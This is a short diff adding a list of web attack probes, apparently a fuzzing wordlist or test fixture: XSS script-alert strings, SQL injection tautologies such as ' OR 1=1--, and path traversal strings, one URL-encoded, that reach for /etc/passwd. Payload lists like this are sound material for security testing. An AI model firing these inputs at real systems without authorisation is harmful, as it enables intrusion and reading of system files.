@@ -1,0 +1,7 @@
+<script>alert('xss')</script>
+<script>alert(document.domain)</script>
+' OR '1'='1
+' OR 1=1--
+../../../../etc/passwd
+../etc/passwd
+%2e%2e%2fetc%2fpasswd
